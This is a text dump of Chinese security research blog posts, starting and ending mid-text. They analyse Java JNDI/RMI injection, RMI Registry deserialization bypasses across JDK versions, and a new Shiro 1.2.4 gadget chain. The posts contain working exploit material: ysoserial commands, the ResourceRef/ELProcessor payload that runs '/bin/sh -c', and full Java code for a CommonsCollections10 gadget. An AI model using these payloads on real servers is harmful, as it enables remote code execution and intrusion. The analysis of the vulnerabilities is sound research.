1.2.24版本的RCE为例，来试验JNDI 首先开启一个evil rmi server 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj \"touch /tmp/success\" 用vulhub的环境 在服务器端会接收到连接 进到docker里可以看到生成了success文件 0x04 后续前文用的环境是JDK8u111，在后续的JDK8u113以及JDK6u132, JDK7u122之后增加了对远程codebase的限制 系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。 Changelog: JDK 6u141 http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141 JDK 7u131 http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html JDK 8u121 http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html 摘自https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html 那么如果存在这样一个漏洞但是又是高版本的JDK环境，该怎么进行bypass呢？ 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 摘自https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html 上面的这篇文章提出了上面两种方案来进行。 利用底层协议实现上的漏洞先来说一下第二种，这里提到利用的是LDAP，这部分我们后面再详细叙述，其实原理跟RMI的反序列化问题是一样的。 我在浅谈Java RMI反序列化问题中曾提到过，JRMPListener利用的是RMI Client在接收Exception时发生的反序列化漏洞。而这里的JNDI底层用的仍然是RMI那套(如果协议是RMI的话)，所以我们发起一个链接到ysoserial的JRMPListener也还是能成功利用的，不管有没有设置com.sun.jndi.rmi.object.trustURLCodebase为true。当然如果要利用成功，发起端必须要有反序列化利用链所依赖的组件并且合适的JDK版本才可以。 利用可利用的本地Factory对象然后我们来继续看看第一种情况 在前面分析NamingManager的getObjectFactoryFromReference时，我略过了本地的factory的载入部分的代码 这里首先会在本地的CLASSPATH里找这个factoryName，如果找到了，后续就不用进行远程加载。所以如果本地可以找到一个可利用的factory，也能突破JNDI的远程加载的限制。 前面的文章中提到了tomcat（或glassfish）中的BeanFactory的利用，来分析一下 首先在后续的调用中，factory的getObjectInstance函数将会被调用 123// ref 为我们传入的Reference 可控// name 为factory的name，这里就是我们自己伪造的*EvilObj* 可控factory.getObjectInstance(ref, name, nameCtx, environment); 来看一下BeanFactory中getObjectInstance函数的实现，函数有点长，我们挑重点看 123456789101112131415161718192021222324if (obj instanceof ResourceRef) &#123; try &#123; Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; ClassLoader tcl = Thread.currentThread().getContextClassLoader(); if (tcl != null) &#123; try &#123; beanClass = tcl.loadClass(beanClassName);// 载入指定class &#125; catch(ClassNotFoundException e) &#123; &#125; &#125; else &#123; try &#123; beanClass = Class.forName(beanClassName);// 载入指定class &#125; catch(ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; // ... // ... Object bean = beanClass.newInstance();// 实例化 先看这部分代码，当前我们传入的Reference必须是ResourceRef对象，并在后续加载ResourceRef的beanClass和shilihuanewInstance进行(而这里的class我们可以在赋值时随意指定)。 123456789101112131415161718192021222324252627RefAddr ra = ref.get(\"forceString\");Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;();String value;if (ra != null) &#123; value = (String)ra.getContent(); // ... /* Items are given as comma separated list */ for (String param: value.split(\",\")) &#123; param = param.trim(); index = param.indexOf('='); if (index &gt;= 0) &#123;// 如果内容中存在=，提取=后面的字符串作为函数名 setterName = param.substring(index + 1).trim(); param = param.substring(0, index).trim(); &#125; else &#123; setterName = \"set\" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1); &#125; try &#123; forced.put(param, beanClass.getMethod(setterName, paramTypes)); &#125; // ... &#125;&#125; ReferenceRef存在着可控的键值对关系，通过get函数获得，如上述代码ref.get(&quot;forceString&quot;)将会获得forceString相对应的RefAddr，通过调用RefAddr的getContent函数就可以获得forceString键对应的值。 这里需要注意的是，当forceString对应的内容中存在=时，将截取=后面的字符串作为后续调用的函数名。这意味着我们可以任意指定当前对象的类函数了。force键值对中将包含=前面的内容和相应的Method对象。例如test=eval,最终我们将得到eval的Method对象 123456789101112131415161718192021222324252627282930313233Enumeration&lt;RefAddr&gt; e = ref.getAll();while (e.hasMoreElements()) &#123; ra = e.nextElement(); String propName = ra.getType(); if (propName.equals(Constants.FACTORY) || propName.equals(\"scope\") || propName.equals(\"auth\") || propName.equals(\"forceString\") || propName.equals(\"singleton\")) &#123; continue; &#125; value = (String)ra.getContent(); Object[] valueArray = new Object[1]; /* Shortcut for properties with explicitly configured setter */ Method method = forced.get(propName); if (method != null) &#123; valueArray[0] = value; try &#123; method.invoke(bean, valueArray); &#125; catch (IllegalAccessException| IllegalArgumentException| InvocationTargetException ex) &#123; throw new NamingException (\"Forced String setter \" + method.getName() + \" threw exception for property \" + propName); &#125; continue; &#125; ref.getAll获取了所有的RefAddr，对于非Constants.FACTORY/scope/auth/forceString/singleton且前文又获取相应的Method对象时，我们将调用该对象，其函数参数为此时RefAddr的内容。比如存在一个RefAddr的type为test，将调用前面的eval的Method对象。 到这里，我们就完成了一次反射调用，来看看poc 1234567891011121314// payload from kingxResourceRef ref = new ResourceRef( \"javax.el.ELProcessor\",// bean class null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",// factory class null);ref.add(new StringRefAddr(\"forceString\", \"KINGX=eval\"));// eval函数Method对象将会被调用ref.add(new StringRefAddr(\"KINGX\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\")\" + \".newInstance().getEngineByName(\\\"JavaScript\\\")\" + \".eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](\" + \"['/bin/sh','-c','\"+ command +\"'])\" + \".start()\\\")\"));// eval函数的参数为上述执行命令的el语句 0x05 总结前面对JNDI with RMI做了一些简单的介绍，当遇到可控的JNDI lookup函数，我们可以发起JNDI链接到RMI服务上，利用JNDI Naming Manager的远程codebase加载机制载入任意的bytecodes。 当然，前面的利用方式仅在JDK8u113、JDK6u132,、JDK7u122版本之前，如果遇到了高版本的JDK，我们可以尝试利用本地CLASSPATH中可利用的反序列化利用链，或者是tomcat环境下的可利用的ObjectFactory。 在后续可利用的本地Factory这个思路上，原文作者kingx提出或许其他的中间件环境也可能存在这种可利用的ObjectFactory，这里立个flag，以后有空了一定要找找XD"},{"title":"【notes】浅谈Java RMI Registry安全问题","permalink":"http://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/","text":"0x00 前言本文讲述了Java RMI Registry相关的反序列化问题，主讲Registry，后续补充了Client端和Server端的利用 0x01 原理Java RMI流程可参考1，出问题的位置在于： 情景一：Registry 接收bind/rebind请求 从Client接收到的bind或rebind的remote obj，将由sun/rmi/registry/RegistryImpl_Skel.java#dispatch处理 （下图为JDK8u141之前的版本的实现） 可以看到获取到的序列化数据直接调用了readObject函数，导致了常规的Java反序列化漏洞的触发。 这里我们只需要写一个bind或rebind的操作，即可攻击到RMI Registry。 注意：bind/rebind请求的限制Registry对于bind/rebind的请求，会去检查这个请求是否为本地请求，对于外部的请求，Registry会拒绝该请求。 这里思路是正确的，可以防止外部的恶意绑定，但是他在实现上存在问题。 JDK 8u141之前，首先会去接收传送过来的对象，并将其进行readObject反序列化，实际判断是否为本地请求，是在put新的绑定对象之前进行的。这意味着在checkAccess之前我们就可以完成反序列化操作，该限制并没有起到相应的作用。 而在JDK 8u141版本之后，sun/rmi/registry/RegistryImpl_Skel.java#dispatch 这里会先去判断是否为本地绑定请求，然后再进行反序列化。 所以如果要使用bind/rebind请求来远程攻击Registry，JDK版本必须在8u141之前 情景二：Registry接收lookup请求由于bind/rebind请求在141后续版本存在限制，所以为了攻击Registry我们必须找其他的方法。 在RMI里客户端向Registry发起lookup请求是不限制请求源的，那么lookup是否可以被我们利用呢？ 答案是肯定的，来看sun.rmi.registry.RegistryImpl_Skel#dispatch对于lookup请求的处理 可以看到在这里，接收到lookup发送过来的内容时，也是直接对其进行反序列化操作。但是这里并没有bind/rebind的请求源限制，所以我们可以直接lookup发起对141版本之后的registry的攻击。 我们在构造lookup函数请求时，只需重新实现一下lookup函数的实现就可以了（这里将Naming.lookup和RegistryImpl_Stub.lookup进行了合并，并将传送过去的内容改成了任意的Object对象）。 0x02 攻击Registry jdk&lt;8u121环境使用jdk8u111，该版本下的RMI Registry接收的remote obj只要继承了Remote类即可（原理见2），没有其他的限制。 ysoserial工具中的ysoserial.exploit.RMIRegisterExploit采用了代理Remote类的方式来解决这个限制。 使用如下命令即可 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit RMIRegisterHost RMIRegisterPort CommonsCollections7 &quot;open /System/Applications/Calculator.app&quot; 简单看一下ysoserial.exploit.RMIRegisterExploit的原理根据前面文章中的原理，我们传过去的对象必须要是一个继承了java.rmi.Remote接口的对象。这里ysoserial工具则直接利用动态代理的原理，对Remote类做代理，其处理的handler用了CommonsCollections中常用的AnnotationInvocationHandler。但其触发点变为handler的memberValues属性被反序列化所执行的利用链。 接下来，远程bind对象将构造好的remote对象传过去即可，来看一下这个代码 0x03 攻击Registry jdk&lt;8u232_b09jdk8u121修复后的版本里，对反序列化的类做了白名单限制，见sun/rmi/registry/RegistryImpl.java#registryFilter 这个白名单包括： 12345678910111213if (String.class == clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED;&#125; else &#123; return ObjectInputFilter.Status.REJECTED;&#125; 0x02中发送的对象是代理后的AnnotationInvocationHandler对象，并不在上述允许的类里面，这导致原先ysoserial工具中的ysoserial.exploit.RMIRegisterExploit无法利用。这里我们参考3的方法来达成利用。 首先思路比较明确的是，如果要绕过这个限制，我们需要在上述的白名单里找到可以利用的对象。 在白名单里我们注意一下两个特殊对象Remote对象和UnicastRef对象 1. UnicastRef对象我们都知道RMI过程中存在客户端与服务器端之间的交互，那么在代码层面，我们需要怎么去创造这样一个链接呢？ 由于漏洞发生点为向远程服务器注册对象的引用。回顾一下，我们在bind时，会先去获得一个Registry，类似下面 1Registry registry = LocateRegistry.getRegistry(\"192.168.98.80\"); 跟进java/rmi/registry/LocateRegistry.java#getRegistry 注意到这样一段代码，通过TCPEndpoint注册服务端的host、端口等信息，以UnicastRef封装liveRef.在下面createProxy时使用了RemoteObjectInvocationHandler作为UnicastRef动态代理的处理类 最终，我们将以客户端的身份去链接，所以这里的Registry会是sun/rmi/registry/RegistryImpl_Stub.java#bind向远程RMI Registry注册。 newCall发起连接，并将需要绑定的对象发送过去。 到这里就结束了向远程Registry发起绑定的操作。这个过程中我们用到了UnicastRef对象，那么这里想象一下，如果我们可以控制UnicastRef对象里LiveRef的host和port，那么我们就能发起任意的RMI连接。这里就是ysoserial中JRMPClient的原理，来看一下这个payload 是不是很熟悉XD，使用的方法就是前面绑定过程中的代码。而在白名单里UnicastRef对象是允许被反序列化的。 2. RemoteObjectInvocationHandler对象前面分析到UnicastRef可被用于发起RMI连接，但是为了符合发送的条件，仍然需要满足实现Remote接口的条件。而UnicastRef并没有实现Remote接口，这就意味着直接传UnicastRef是不行的，我们还需要再多做一步，这里有两种方法： 跟RMIRegisterExploit一样，使用Proxy反射来实现，其handler继承于Remote并处理了构造好的UnicastRef，这里用到的就是RemoteObjectInvocationHandler 找到一个可以封装UnicastRef的对象，并且该对象还实现了Remote对象 这里JRMPClient使用的RemoteObjectInvocationHandler就是第一种方法，我们将AnnotationInvocationHandler替换成RemoteObjectInvocationHandler。在反序列化时会调用RemoteObjectInvocationHandler的父类RemoteObject的readObject函数 这里的ref就是我们传进去的UnicastRef，调用其readExternal函数，这里介绍一下readExternal Java默认的序列化机制非常简单，而且序列化后的对象不需要再次调用构造器重新生成，但是在实际中，我们可以会希望对象的某一部分不需要被序列化，或者说一个对象被还原之后，其内部的某些子对象需要重新创建，从而不必将该子对象序列化。 在这些情况下，我们可以考虑实现Externalizable接口从而代替Serializable接口来对序列化过程进行控制。Externalizable接口extends Serializable接口，而且在其基础上增加了两个方法：writeExternal()和readExternal()。这两个方法会在序列化和反序列化还原的过程中被自动调用，以便执行一些特殊的操作。 https://xz.aliyun.com/t/5392 这里的readExternal就是重新创建一个tcp连接 继续往下跟 重新生成一个LiveRef对象后，将存储到当前的ConnectionInputStream上。后续该stream会继续调用registerRefs函数 最终由DGCClient发起连接，下图中的loopup函数 到这里后面就是JRMPListener反序列化的东西了，这里在最后进行分析。 3. RMIConnectionImpl_Stub对象前面提到了两种思路，还有一种就是找到一个实现了Remote接口并且封装了ref的对象，这里RMIConnectionImpl_Stub对象就是 RemoteObjectInvocationHandler后续的触发主要依靠RemoteObject对象的readObject函数的重新填充，而RMIConnectionImpl_Stub对象也继承了RemoteObject所以后面的一些调用过程跟第二个对象一样，不再叙述。 其实顺着思路找还能发现DGCImpl_Stub、RMIServerImpl_Stub、RegistryImpl_Stub、ReferenceWrapper_Stub都可以 20200616 更新一个小trick前面2的部分提到了由于UnicastRef的反序列化，还原的内容ref会被注册到当前的ConnectionInputStream的incomingRefTable，并于StreamRemoteCall的releaseInputStream时调用发起反向jrmp链接。 这里的重点在于UnicastRef的反序列化，我们在3的部分找的那几个类都是因为封装UnicastRef，在实际反序列化的过程中，这几个类的属性被调用反序列化而还原UnicastRef。 在常见的readObject函数的处理中，其实有一点很重要，他是一个递归反序列化的过程，就算当前类不存在，但是还是会去递归反序列化当前数据中的类属性。 所以我们也可以不用前面找到的几个类，自己写一个封装UnicastRef也能同样达到这种效果，具体看RMIConnectWrapped 0x04 后续 jdk&gt;=8u232_b09jdk版本8u232_b09修复了前面使用反向发起JRMP连接的利用。修复点包括两个 一：RegistryImpl_Skelsun.rmi.registry.RegistryImpl_Skel#dispatcher，这里截了lookup函数的处理，bind/rebind函数的处理是一样的 当发生反序列化错误或者类型转换错误时，会调用call.discardPendingRefs，将现有的JRMP连接清除掉。也就意味着这里我们无法用JRMP反向链接的方式来达成利用了。 二：DGCImpl_Stub当Registry处理JRMP反连的时候，会调用DGCImpl_Stub#dirty，而ref.invoke会最终调用sun.rmi.transport.StreamRemoteCall#executeCall来处理返回的异常，这里会最终导致反序列化(详细见0x05番外) 而在232版本，将原本在后面注册的leaseFilter提到了前面 看看该过滤器的限制sun/rmi/transport/DGCImpl_Stub.java#leaseFilter 对于返回的序列化对象，只允许上面的几种类型，而现有的反序列化利用链中HashSet、HashTable等类都是通不过的。 所以在Registry发起的反向连接是无法利用成功的。 ps:这里用的DGCImpl_Stub是客户端发起时使用的，相对应的还有server端接收Client发起的连接的处理DGCImpl_Skel，skel这里也存在反序列化漏洞，具体见0x08 0x05 番外：ysoserial中的JRMPListener与JRMPClient看了上面可能你会疑惑，为什么server端发起一个RMI的连接就会触发java反序列化？ 前文我们将的是RMI Registry在接收远程绑定对象时所发生的反序列化漏洞，那么RMI Client在接收Server端的数据时是否也会发生反序列化漏洞呢？答案是肯定的，毕竟RMI交互过程中的数据采用的是序列化的数据，也就意味着存在着一个反序列化的过程。 看一下JRMPListener的代码，简单来说，其实现了与RMI Client的交互流程。这里我们直接看重点的代码 在完成前面的一些交互步骤后，Listener会向Client发送一个ExceptionalReturn的状态，并将序列化的payload填充到BadAttributeValueExpException的val属性。这里用的BadAttributeValueExpException并不是我们以前分析时做的toString触发点，而是仅作为payload的一个载体，在反序列化BadAttributeValueExpException的val属性时同样反序列化了我们的payload。 而位于Client在接收到ExceptionalReturn时的处理方式见sun/rmi/transport/StreamRemoteCall.java#executeCall前面的分析都省略了 在这里我们看到了熟悉的readObject函数，其用于将前面的Exception进行反序列化。 到这里就可以串起来了，Client发起RMI连接，连接到我们的恶意Listener上面。而我们的Listener将返回一个构造好的Exception，旨在Client接收到ExceptionalReturn的信号时进行还原，从而造成了RMI Client端也受到反序列化漏洞的攻击。 0x06 总结前文主要讲诉了RMI的相关反序列化问题，包括RMI Registry和RMI Client接收到反序列化数据时产生的反序列化漏洞。 全文所使用的JDK版本为JDK8，在分析过程中，发现在最近的JDK8u版本上，已无法对RMI Registry发起攻击，但其在JDK8u232_b09之前的版本还是可以的。 本文主要攻击的是RMI Registry，而RMI的攻击面不单单文中提到的这种方式，还存在 针对codebase的攻击见https://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.md，加载我们构造好的class。当然现在这种情况比较少了。 针对绑定的危险obj的攻击，我们可以通过list所有绑定的obj，查找危险的绑定地址进行攻击。这里的危险怎么定义呢？第一是绑定的对象确实存在操作系统命令等；第二是该对象的类函数参数中存在反序列化点，比如hello(HashTable xxx)，其中的HashTable是CommonsCollections7的触发点，在传递过程中，xxx会被序列化，到了RMI Server时会反序列化，也就执行了我们的payload。最后，这里暂时还没找到案例… 0x07 20200303更新 UnicastRemoteObject Gadget这个Gadget的来源是https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/ 经过测试，这个Gadget可以做到跟JRMPClient一样的效果，但是无法跟上面的Level2一样绕过限制，原因看下面 本地在bind或rebind一个Remote对象时，会在sun/rmi/server/MarshalOutputStream.java#replaceObject进行转化 原来的对象会被转化成上面的一个结构，这里直接丢掉了UnicastRemoteObject，自然在Registry端无法从UnicastRemoteObject的readObject函数开始，这样这个Gadget就无法成功利用了。 要想利用这个链来绕过限制，我们可能得自己写一个bind的过程才可以，把getTarget的过程去掉直接发过去。这个Gadget利用价值比较低XD ps：貌似可以通过重写的方式来解决这个问题，这里有空再分析XD 20200617 更新UnicastRemoteObject Gadget前面在做分析时，发现在使用这个利用链的时候，在发过去之前就会被替换UnicastRef的问题，导致我们发到Registry后无法还原出正确的jrmp，今天来看看他是怎么替换的 java.io.ObjectOutputStream#writeObject0#1143 12345678if (enableReplace) &#123; Object rep = replaceObject(obj); if (rep != obj &amp;&amp; rep != null) &#123; cl = rep.getClass(); desc = ObjectStreamClass.lookup(cl, true); &#125; obj = rep;&#125; 从call.getOutputStream()获取到的outputstream在写入具体的object时，后续会执行到前面的代码上，判断是否需要enableReplace（默认是true），所以会默认走到我在3月份时分析的地方，把我们想要的jrmp连接给替换掉了。 所以解决这个问题的方案就是将这个enableReplace给置为false，这里实现起来就比较简单了，我们可以直接对outputstream做反射调用，替换true为false，具体实现见L34 这里需要提一点的是这条链巧妙之处在于 UnicastRemoteObject利用链用到的对象都是在Registry可反序列化的白名单里的 跟前面几个封装unicastref的思路不同，UnicastRemoteObject实际上是主动向外发出jrmp连接的方式，而不是前面通过incomingtable表的方式去触发jrmp连接 为什么说他巧妙呢？在&gt;=8u232_b09版本存在两个限制（具体见0x04） 消除了封装unicastRef的威胁 在DGC层添加了白名单的方式，导致就算jrmp能反链也不能反序列化出白名单之外的类 而UnicastRemoteObject绕过了上面的两个限制 首先对于第一个限制，UnicastRemoteObject的jrmp反连发生在readObject过程中 其次对于第二个限制，前面提到Registry能触发JRMP反连主要是因为调用了DGCClient.registerRefs去处理 而过这个点就需要受到前面提到的DGC白名单的问题。怎么绕过这个地方？简单的就是找一个不经过DGCClient来触发即可。 前面分析&lt;8u232_b09时，用到的RemoteObjectInvocationHandler的方式来触发，不过这里其实只用到了封装UnicastRef的作用（这里提一下实际触发时需要调用UnicastRef.invoke）。UnicastRemoteObject对这个handler做了更深入的利用，这里用到了java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod 调用了ref.invoke触发jrmp反连，到这里都没有经过DGCClient的路径，自然也就没有白名单的限制。 不过这条链到了8u242也失效了，主要原因在于lookup接口无法再反序列化非string类型的object了 0x08 RMI DGC实现问题(ysoserial.expliots.JRMPClient)在JEP290之前，RMI的DGCImpl_skel#dipatch接收处，获取到数据后，直接readObject造成的。 在JEP290之后，反序列化前做了校验，见DGCImpl 导致了ysoserial的exploit中的JRMPClient失效 0x09 总结中第二种方式的触发点（20200317 更新）前面总结中提到的第二中方式：通过寻找可以利用的绑定对象的函数的参数进行反序列化利用 直接讲触发点sun/rmi/server/UnicastServerRef.java#dispatch#338 当我们编写Client端对Server端挂载的对象进行远程函数调用（RMI）时，Server端会逐一进行（获取到Methtod，解析parameters，最后进行invoke调用）。而在解析params时（我们讲过RMI过程中，对象均是序列化的状态）我们需要先对参数对象进行反序列化，也就是第338行所做的工作，继续往下跟 在函数unmarshalParametersUnchecked中分别对每个参数进行反序列化还原 如果所接受的类型非基础数据结构，那么将直接调用readObject，这部分并没有前面filter的限制 所以如果找到了一个Server端挂载的对象存在函数参数类型为Object、HashTable等类型时，我们可以直接穿入构造好的反序列化利用链。当前前提还是Server端的环境中存在相应的反序列化利用链的依赖。"},{"title":"【notes】Java反序列化利用链挖掘之Shiro反序列化","permalink":"http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/","text":"0x00 前言在跟了一遍commons-collections系列的payload后，终于可以开始解决一下当时对shiro反序列化模凌两可的认识了。 当前，不管是国内实际的xx行动还是ctf比赛，shiro反序列化会经常看到。但在实际利用这个漏洞的时候，会发现我们无法在tomcat下直接利用shiro-sample中的commons-collections:3.2.1（2021-03-16更新，这里经p牛指正，shiro并没有依赖cc库，详情）。 我们前面已经对commons-collections系列利用链的分析，今天就来根据学到的知识来解决这个问题。 本文讨论了shiro-1.2.4版本无法直接利用现有的ysoserial利用链，并提出了相应的解决方案。 0x01 环境准备这里用的是shiro-root-1.2.4的samples/web环境，clone下来后执行git checkout shiro-root-1.2.4 利用脚本参考的知道创宇的一篇分析 ysoserial用的0.0.6版本https://github.com/frohoff/ysoserial 先来讲一下，关于环境方面遇到的坑： 在部署过程中，遇到了The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this application的错误 这里的解决方案是修改pom.xml ​ 添加jstl的具体版本即可解决。 serialVersionUID不一致导致无法反序列化的问题 这里可能在你的实验环境下不一定会遇到，我的实验环境和ysoserial生成的某几个类的serialVersionUID不一致，导致无法正常反序列化。在实战中你可以采用这篇文章处理方法，这里我的解决方案是直接同步个commons-collections:3.2.1版本，在生成war包前，在pom.xml加入 123456&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 0x02 前景回顾16年的时候，shiro爆出了一个默认key的反序列化漏洞。至今已有大量的分析文章分析了该漏洞的原理，所以本文不再重复分析该漏洞的相关原理，可以参考以下几篇文章的分析： 1.https://blog.knownsec.com/2016/08/apache-shiro-java/ 2.https://blog.zsxsoft.com/post/35 3.http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html 除了1中在漏洞环境下添加了commons-collections:4.0，另外两篇文章均提到了在tomcat下无法直接利用commons-collections:3.2.1的问题。接下来我们就来看看是什么原因吧：） org.apache.shiro.io.DefaultSerializer.deserialize:67 这里我们直接看反序列化发生的点，第75行使用了ClassResolvingObjectInputStream类而非传统的ObjectInputStream.这里可能是开发人员做的一种防护措施？他重写了ObjectInputStream类的resolveClass函数，我曾在第一篇基础文章中分析过Java反序列化的过程，ObjectInputStream的resolveClass函数用的是Class.forName类获取当前描述器所指代的类的Class对象。而重写后的resolveClass函数 采用的是ClassUtils.forName，我们继续看这个forName的实现。 来看看这个ExceptionIgnoringAccessor是怎么实现的 这里实际上调用了ParallelWebAppClassLoader父类WebappClassLoaderBase的loadClass函数（可以直接下断点看看内容）。 该loadClass载入按照上述的顺序（这里不贴代码了，找到org.apache.catalina.loader.WebappClassLoaderBase.loadClass即可），先从cache中找已载入的类，如果前3点都没找到，再通过父类URLClassLoader的loadClass函数载入。但是实际上此时loadClass的参数name值带上了数组的标志，即/Lorg/apache/commons/collections/Transformer;.class，在参考的第二篇文章里有提到这个问题，所以导致shiro无法载入数组类型的对象。 那么如何才能真正的利用commons-collections:3.2.1来构造利用链呢？ 首先，在参考的第一篇文章里，作者在环境中引入了commons-collections:4.0，使得ysoserial的CommonsCollections2利用链可以成功利用。这是因为CommonsCollections2用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。 那么，问题来了，我们是否能构造出一个在commons-collections:3.2.1下可以利用，并且在利用链上不存在数组类型的对象？答案当然是肯定的：） 0x03 新利用链构造根据0x02的介绍，我们可以清楚的是利用链中的ChainedTransformer这个类的利用是无法成功的，因为他的类属性iTransformers是数组类型的Transformers，也就是在执行过程中发生的ClassNotFoundException。 如果你看过前几篇关于commons-collections系列的payload分析，那么你肯定可以回忆起来，除了利用ChainedTransformer这种方式，还可以使用TemplatesImpl.newTransformer函数来动态loadClass构造好的evil class bytes（这一部分不复述了，可以看前面的文章）。并且在这部分利用链上是不存在数组类型的对象的。 那么，接下来的重点就是找一个如何触发TemplatesImpl.newTransformer的方法了：） 我们先来回顾一下CommonsCollections2的利用链 123456789PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 在这条链上，由于TransformingComparator在3.2.1的版本上还没有实现Serializable接口，其在3.2.1版本下是无法反序列化的。所以我们无法直接利用该payload来达到命令执行的目的。 那么就来改造改造吧！我们先将注意力关注在InvokerTransformer.transform()上 这里是最经典的反射机制的写法，根据传入的input对象，调用其iMethodName（可控）。那么如果此时传入的input为构造好的TemplatesImpl对象呢？ 很明显，这样我们就可以通过将iMethodName置为newTransformer，从而完成后续的templates gadgets。 那么问题来了，怎么将传入的input置为TemplatesImpl对象呢？ 在ysoserial的利用链中，关于transform函数接收的input存在两种情况。 1.配合ChainedTransformerInvokerTransformer往往同ChainedTransformer配合，循环构造Runtimt.getRuntime().exec。很明显，这里我们无法利用了。 2.无意义的String这里的无意义的String指的是传入到ConstantTransformer.transform函数的input，该transform函数不依赖input，而直接返回iConstant 这里第一条路肯定断了，那么就是怎么利用这个无意义的String了！ 从CommonsCollection5开始，出现了TiedMapEntry，其作为中继，调用了LazyMap（map）的get函数。 来看一看 其中map和key我们都可以控制，而LazyMap.get调用了transform函数，并将可控的key传入transform函数 这里就接上了我们前面讨论的，将构造好的TemplatesImpl（key）作为InvokerTransformer.transform函数的input传入，我们就可以将templates gadgets串起来了。 简单来说，我们将CommonsCollections5,6,9构造链中的TiedMapEntry的key用了起来。 123final Object templates = Gadgets.createTemplatesImpl(command);// TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); //原来的利用方式TiedMapEntry entry = new TiedMapEntry(lazyMap, templates); 这里将无意义的foo改造成了触发TemplatesImpl.newTransformer的trigger。 而在TiedMapEntry前的利用链，在原生shiro环境下，并不冲突（没有数组类型的对象），可以正常反序列化。这一部分就省略了。 20200108补充其实createTemplatesImpl的利用方式中还是存在数组形式的，byte[]数组用于存储evil class。但是在tomcat 7及以上的环境下，java的原生数据类型的数组还原不影响反序列化，只针对对象级别的数组还原。而tomcat6的实现方式直接不允许数组类型的还原，也就是说该利用链在tomcat6的环境下是成功不了的。 20200109补充当应用开启了security manager时，需要设置-Djdk.xml.enableTemplatesImplDeserialization=true 0x04 EXP编写这里其实可以构造出好几个链，我这里就拿HashSet为例，完整的exp见MyYsoserial中的CommonsCollections10 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849final Object templates = Gadgets.createTemplatesImpl(command);// 构造带有evil class bytes的TemplatesImpl// 构造InvokerTransformer，填充无害的toString函数final InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]);final Map innerMap = new HashMap();// 构造LazyMap的factory为前面的InvokerTransformerfinal Map lazyMap = LazyMap.decorate(innerMap, transformer);// 填充TiedMapEntry的map（lazyMap）和key（TemplatesImpl）TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);HashSet map = new HashSet(1);map.add(\"foo\");// 下述代码将entry填充到HashSet的node的key上，可以使得HashSet在put的时候调用TiedMapEntry的hashCode函数Field f = null;try &#123; f = HashSet.class.getDeclaredField(\"map\");&#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\");&#125;Reflections.setAccessible(f);HashMap innimpl = null;innimpl = (HashMap) f.get(map);Field f2 = null;try &#123; f2 = HashMap.class.getDeclaredField(\"table\");&#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\");&#125;Reflections.setAccessible(f2);Object[] array = new Object[0];array = (Object[]) f2.get(innimpl);Object node = array[0];if(node == null)&#123; node = array[1];&#125;Field keyField = null;try&#123; keyField = node.getClass().getDeclaredField(\"key\");&#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");&#125;Reflections.setAccessible(keyField);keyField.set(node, entry);// 将最终的触发函数newTransformer装载到InvokerTransformer上Reflections.setFieldValue(transformer, \"iMethodName\", \"newTransformer\");return map; 这里不对源码进行讲解了，都写在了注释里。 这里整理一下这条链的调用过程 12345678910java.util.HashSet.readObject()-&gt; java.util.HashMap.put()-&gt; java.util.HashMap.hash() -&gt; 